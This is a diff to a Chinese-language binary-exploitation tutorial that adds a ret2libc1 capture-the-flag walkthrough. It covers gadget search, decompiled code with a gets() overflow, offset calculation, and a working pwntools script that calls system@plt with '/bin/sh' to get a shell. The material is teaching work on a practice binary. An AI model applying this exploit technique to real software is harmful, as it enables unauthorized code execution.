@@ -1,6 +1,6 @@
 # pwn basic
 
-`更新时间：2024-12-10`
+`更新时间：2025-3-10`
 
 注释解释：
 
@@ -1657,3 +1657,138 @@ int main() {
 
 ### ret2libc1
 
+首先尝试使用`retsyscall`的步骤寻找`gadget`
+
+```assembly
+kiiz@vm:~/桌面$ ROPgadget --binary ret2libc1 --only "pop|ret"
+Gadgets information
+============================================================
+0x080486ef : pop ebp ; ret
+0x080486ec : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804841d : pop ebx ; ret
+0x080486ee : pop edi ; pop ebp ; ret
+0x080486ed : pop esi ; pop edi ; pop ebp ; ret
+0x08048406 : ret
+0x0804854e : ret 0xeac1
+```
+
+可以看出，这次的程序中能找到的有关`pop|ret`的命令并不能够让我们构建一个完整的payload，那我们再尝试在程序中寻找后门函数
+
+```c
+void secure()
+{
+  time_t v0; // eax
+  int input; // [esp+18h] [ebp-10h] BYREF
+  int secretcode; // [esp+1Ch] [ebp-Ch]
+
+  v0 = time(0);
+  srand(v0);
+  secretcode = rand();
+  __isoc99_scanf("%d", &input);
+  if ( input == secretcode )
+    system("shell!?");
+}
+```
+
+我们在程序中找到了`secure()`函数，该函数虽然调用了`system()`函数，但是并没有获取`shell`
+
+虽然此处的`system()`没有直接用处，但是`system()`会在`.got`表中留下实际的内存地址供我们调用
+
+> <img src="./img/72.png">
+
+在调用了`system()`函数后，我们只需要在栈上传入`system()`的参数`"/bin/sh"`就能直接`getshell`
+
+*注：32位程序使用栈传参，64位程序使用寄存器传参*
+
+在解题之前，我们还需要了解如何传递参数，本题是32位程序，使用栈传参，而参数的位置位于`system()`栈帧的高2地址长度的位置
+
+> <img src="./img/73.png">
+
+为什么看起来是高1个地址长度？因为在`system()`函数中，第一条执行的命令是`push ebp`，该命令会将`system()`函数自己的`ebp`压入栈中
+
+> <img src="./img/74.png">
+
+对于`system ebp`上方的返回地址，可以是垃圾数据，如有需要，也可以是其他`gadget`，这道题只需要垃圾数据即可
+
+#### 攻击流程
+
+1. 检查文件安全措施
+
+> <img src="./img/75.png">
+
+仅有`NX`开启，可以进行栈溢出
+
+2. 使用`IDA`寻找溢出点
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("RET2LIBC >_<");
+  gets(s);
+  return 0;
+}
+```
+
+很显然，溢出点在`gets(s)`函数，且没有现成`shell`函数可用
+
+3. 使用`ROPgadet`寻找`gadget`
+
+> <img src="./img/76.png">
+
+没有足够的`gadget`可用，需要寻找其他方式
+
+4. 在`IDA`中，可以发现`secure()`函数中调用了`system()`函数
+
+```c
+void secure()
+{
+  time_t v0; // eax
+  int input; // [esp+18h] [ebp-10h] BYREF
+  int secretcode; // [esp+1Ch] [ebp-Ch]
+
+  v0 = time(0);
+  srand(v0);
+  secretcode = rand();
+  __isoc99_scanf("%d", &input);
+  if ( input == secretcode )
+    system("shell!?");
+}
+```
+
+可以利用这里的`system()`函数的`plt`项，在溢出位置填入`system@plt`的地址，让程序自己调用`system()`寻找地址
+
+5. 利用`pwndbg`计算溢出长度，并确定`system@plt`的地址
+
+> <img src="./img/77.png">
+
+确定`system@plt`的地址为`0x8048460`
+
+> <img src="./img/78.png">
+
+观察到绝对偏移，`ebp`的位置在`0x88`，`eax`的位置在`0x1c`，距离`0x88 - 0x1c = 108`，因此需要溢出112字节数据
+
+6. 编写攻击脚本
+
+已知溢出112字节，拼接`system@plt`的地址，然后拼接4字节的垃圾数据，该数据实际是程序完成`system()`后返回的函数地址，但是这道题调用`system()`后已经获取了`shell`，不需要进行下一步动作，因此直接传入垃圾数据，最后拼接`"/bin/sh"`的地址，使用`ROPgadget`查询
+
+> <img src="./img/79.png">
+
+```py
+from pwn import *
+
+system_plt = 0x8048460
+bin_sh = 0x08048720
+payload = flat([b'a' * 112, system_plt, b'bbbb', bin_sh])
+
+io = process('./ret2libc1')
+io.sendline(payload)
+io.interactive()
+```
+
+> <img src="./img/80.png">
+
+执行脚本，成功`getshell`
